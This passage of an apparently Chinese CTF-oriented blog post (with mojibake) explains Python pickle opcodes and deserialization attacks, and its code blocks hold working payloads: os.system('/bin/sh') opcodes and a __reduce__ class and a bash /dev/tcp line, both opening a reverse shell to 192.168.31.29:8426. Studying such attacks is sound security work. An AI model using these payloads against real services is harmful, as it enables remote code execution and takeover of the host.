&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x02&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_3&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_4&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_5&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># python2è¾“å‡º protocal&amp;lt;=2&lt;/span>
&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dp0&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">p1&lt;/span>
&lt;span style="color:#111">I1&lt;/span>
&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;span style="color:#111">p2&lt;/span>
&lt;span style="color:#111">I2&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">ï¿½&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>0å·ç‰ˆæœ¬åºåˆ—åŒ–çš„ç»“æœçœ‹èµ·æ¥å¯è¯»æ€§å¾ˆå¼º éƒ½æ˜¯å¯è§†çš„å­—ç¬¦ï¼Œæ“ä½œç ä¹Ÿæ¯”è¾ƒç›´æ¥åœ°æš´éœ²å‡ºæ¥ï¼Œé‡ç‚¹å…³æ³¨å‡ ä¸ªï¼š&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Opcode&lt;/th>
&lt;th>Mnemonic&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>(&lt;/td>
&lt;td>MARK&lt;/td>
&lt;td>Push a mark object onto the stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>S&lt;/td>
&lt;td>STRING&lt;/td>
&lt;td>string&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>I&lt;/td>
&lt;td>INT&lt;/td>
&lt;td>Push integer or bool; decimal string argument&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>l&lt;/td>
&lt;td>LIST&lt;/td>
&lt;td>build a list from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>d&lt;/td>
&lt;td>DICT&lt;/td>
&lt;td>build a dict from stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>}&lt;/td>
&lt;td>EMPTY_DICT&lt;/td>
&lt;td>Push empty dict&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>t&lt;/td>
&lt;td>TUPLE&lt;/td>
&lt;td>Build a tuple from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>)&lt;/td>
&lt;td>EMPTY_TUPLE&lt;/td>
&lt;td>Push empty tuple&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>c&lt;/td>
&lt;td>GLOBAL&lt;/td>
&lt;td>Push self.find_class(module, args); 2 string args&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>R&lt;/td>
&lt;td>REDUCE&lt;/td>
&lt;td>Apply callable to argtuple, both on stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>b&lt;/td>
&lt;td>BUILD&lt;/td>
&lt;td>call &lt;code>__setstate__&lt;/code> or &lt;code>__dict__.update()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>i&lt;/td>
&lt;td>INST&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>o&lt;/td>
&lt;td>OBJ&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.&lt;/td>
&lt;td>STOP&lt;/td>
&lt;td>Every pickle ends with STOP&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>ä½¿ç”¨**&lt;u>pickletools&lt;/u>**å¯ä»¥å°†opcodeè½¬åŒ–ä¸ºè‚‰çœ¼å¯è¯»å–çš„å½¢å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickletools&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">cbuiltins&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">exec&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x13\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;q&lt;/span>&lt;span style="color:#8045ff">\x01\x85&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">Rq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>
&lt;span style="color:#111">pickletools&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x80&lt;/span> &lt;span style="color:#111">PROTO&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span> &lt;span style="color:#d88200">&amp;#39;builtins exec&amp;#39;&lt;/span>
&lt;span style="color:#ae81ff">17&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">X&lt;/span> &lt;span style="color:#111">BINUNICODE&lt;/span> &lt;span style="color:#d88200">&amp;#34;key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#ae81ff">43&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#ae81ff">45&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x85&lt;/span> &lt;span style="color:#111">TUPLE1&lt;/span>
&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">R&lt;/span> &lt;span style="color:#111">REDUCE&lt;/span>
&lt;span style="color:#ae81ff">49&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;span style="color:#ae81ff">51&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">STOP&lt;/span>
&lt;span style="color:#111">highest&lt;/span> &lt;span style="color:#111">protocol&lt;/span> &lt;span style="color:#111">among&lt;/span> &lt;span style="color:#111">opcodes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å¯ä»¥åˆ©ç”¨çš„æ–¹å‘æ€è·¯">å¯ä»¥åˆ©ç”¨çš„æ–¹å‘&amp;amp;æ€è·¯&lt;/h2>
&lt;p>pickleçš„åº”ç”¨åœºæ™¯å…¶å®å¾ˆå¹¿æ³›&lt;/p>
&lt;ul>
&lt;li>è§£æè®¤è¯token, sessionæ—¶ï¼›å‚è§ï¼š&lt;a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">æŒé˜…iReaderæŸç«™Pythonæ¼æ´æŒ–æ˜&lt;/a>ï¼ˆä¸€ä¸ªredis+pythonååºåˆ—åŒ–çš„æ —å­&lt;/li>
&lt;li>å¯èƒ½å°†å¯¹è±¡pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶&lt;/li>
&lt;li>å¯èƒ½å°†å¯¹è±¡pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“&lt;/li>
&lt;li>å¯èƒ½ä¼šé€šè¿‡å‚æ•°ä¼ é€’ç»™ç¨‹åºï¼›å‚è§ï¼š&lt;a href="https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/">sqlmapçš„ä»£ç æ‰§è¡Œæ¼æ´&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>è¿™é‡Œè¯´ä¸€ä¸‹ç¬¬ä¸€ç‚¹ï¼Œflaské…åˆredisåœ¨æœåŠ¡ç«¯å­˜å‚¨sessionï¼ˆä»¥pickleåºåˆ—åŒ–å½¢å¼è¿›è¡Œå­˜å‚¨ï¼‰ï¼Œå¦‚æœé€šè¿‡cookieè¿›è¡Œè¯·æ±‚session_idæ—¶ï¼Œsessionç§çš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ã€‚ç†è®ºä¸Šæ²¡é—®é¢˜ï¼Œä½†å¦‚æœå‡ºç°redisçš„æœªæˆæƒè®¿é—®ï¼Œå°±å¯ä»¥é€šè¿‡è‡ªå·±è®¾è®¡æ¶æ„çš„sessionï¼Œç„¶åå†è®¾ç½®cookieå»è¯·æ±‚sessionæ—¶ï¼Œæˆ‘ä»¬è‡ªå®šçš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œè¾¾åˆ°äº†rceçš„ç›®çš„ã€‚&lt;/p>
&lt;p>æ„é€ ååºåˆ—åŒ–çš„payloadç¦»ä¸å¼€&lt;code>__reduce__&lt;/code>è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼ˆä¸Šæ–‡ç®€å•çš„æåˆ°è¿‡ï¼‰ï¼Œå®ƒæ˜¯æ–°å¼ç±»ï¼ˆå†…ç½®ç±»ï¼‰ç‰¹æœ‰çš„æ–¹æ³•ï¼ˆå…³äºæ›´å¤špythonå…ƒç±»ç›¸å…³çš„çŸ¥è¯†å¯ä»¥å‚è€ƒstackoverflowçš„è¿™ç¯‡å¸–å­ï¼š&lt;a href="https://stackoverflow.com/questions/100003/what-are-metaclasses-in-python">What are metaclasses in Python?&lt;/a>ï¼‰&lt;/p>
&lt;p>â€”â€”â€”â€”åœ¨python2æœ‰ä¸¤ç§å£°æ˜ç±»çš„æ–¹å¼ï¼Œå¹¶ä¸”å®ƒä»¬å®ä¾‹åŒ–çš„å¯¹è±¡æ€§è´¨æ˜¯ä¸åŒçš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005621153.png" alt="image-20210809005621153">&lt;/p>
&lt;p>python3ä¸­æ¶ˆé™¤äº†ä¸¤è€…çš„åŒºåˆ«ï¼Œè¡¨ç°ä¸ºç¬¬äºŒç§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005849080.png" alt="image-20210809005849080">&lt;/p>
&lt;p>å›åˆ°å…³äº&lt;code>__reduce__&lt;/code>çš„é—®é¢˜ï¼Œåªè¦åœ¨æ–°å¼ç±»ä¸­å®šä¹‰ä¸€ä¸ª &lt;code>__reduce__&lt;/code> æ–¹æ³•ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨åºåˆ—åŒ–çš„ä½¿ç”¨è®©è¿™ä¸ªç±»æ ¹æ®æˆ‘ä»¬åœ¨&lt;code>__reduce__&lt;/code> ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–ã€‚æŒ‡å®šçš„å…³é”®å°±åœ¨äºè¯¥æ–¹æ³•çš„è¿”å›å€¼ä¸Šï¼šä¸€ä¸ª&lt;code>callable&lt;/code>å¯è°ƒç”¨çš„å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯&lt;code> ([para1, para2, ...])[, ...])&lt;/code>ï¼Œè¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„ï¼›æœ€ç®€å•çš„ä¾‹å­æ˜¯&lt;code>return (os.system, ('ls',))&lt;/code>ã€‚&lt;code>__reduce__&lt;/code> æ–¹æ³•ä¸opcodeä¸­çš„RæŒ‡ä»¤ç å…³ç³»å¯†åˆ‡ï¼Œå¯ä»¥è¯´PVMçš„RæŒ‡ä»¤ç å°±æ˜¯&lt;code>__reduce__&lt;/code>çš„è¿”å›å€¼çš„ä¸€ä¸ªåº•å±‚å®ç°ã€‚&lt;/p>
&lt;h3 id="æ­¤å¤„ä¸Šä¸€ä¸ªç®€å•çš„å°æ —å­">æ­¤å¤„ä¸Šä¸€ä¸ªç®€å•çš„å°æ —å­&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># shell.pickle&lt;/span>
&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809002248690.png" alt="image-20210809002248690">&lt;/p>
&lt;p>ä¸Šé¢æ‰‹å†™çš„opcodeæˆåŠŸè¿”å›äº†shçš„shellï¼›è€Œé€šè¿‡dumpså’Œloadså®ç°åˆ™æ˜¯è¿™æ ·ï¼›æˆ‘ä»¬æ‰§è¡Œçš„ä»£ç éƒ½åœ¨&lt;code>__reduce__&lt;/code>ä¸­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">test&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809011024984.png" alt="image-20210809011024984">&lt;/p>
&lt;p>ä¹Ÿé¡ºåˆ©è¿”å›äº†shellï¼Œå¾ˆå®¹æ˜“å‘ç°è·Ÿä¸Šé¢æ‰‹å†™çš„opcodeå¹¶æ— å·®å¼‚ï¼Œè€Œè¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æ„é€ æ—¶çš„&lt;code>__reduce__&lt;/code>å‡½æ•°çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥rceï¼Œåå¼¹shellä¹‹ç±»çš„ã€‚&lt;/p>
&lt;h3 id="å¦ä¸€ä¸ªåå¼¹shellçš„å°æ —å­">å¦ä¸€ä¸ªåå¼¹shellçš„å°æ —å­&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;python2 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;192.168.31.29&amp;#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># æˆ–è€…æœ€ç®€å•çš„æ‰‹å†™opcode ä¸ç”¨ç‰¹æ„æ„é€ class A()&lt;/span>
&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809090941558.png" alt="image-20210809090941558">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linuxåå¼¹shellï¼ˆä¸€ï¼‰æ–‡ä»¶æè¿°ç¬¦ä¸é‡å®šå‘&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­1 - [DasCTF 0721] easyweb
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/#easyweb">ä¹‹å‰å†™è¿‡äº†&lt;/a>ï¼Œåœ¨å¯¹sessionçš„å¤„ç†æ—¶ä½¿ç”¨äº†pickleï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„çš„sessionåå¼¹shellï¼›ä¹Ÿæ²¡æœ‰ç‰¹æ®Šçš„è¿‡æ»¤å’Œé™åˆ¶ï¼Œpayloadæ€ä¹ˆå†™éƒ½è¡Œ&lt;/p>
&lt;/details>
&lt;h3 id="ç”¨marshalåºåˆ—åŒ–ä»»æ„ä»£ç å¯¹è±¡">ç”¨Marshalåºåˆ—åŒ–ä»»æ„ä»£ç å¯¹è±¡&lt;/h3>
&lt;p>å¦‚æœåªåœ¨&lt;code>__reduce__&lt;/code>ä¸­ç”¨&lt;code>-c&lt;/code>å‚æ•°æ‰§è¡Œä»£ç çš„è¯ï¼Œé‡åˆ°ä¸€äº›è‡ªå®šå‡½æ•° åœ¨æ ¼å¼ä¸Šå°±ä¼šæ¯”è¾ƒéº»çƒ¦&lt;/p>
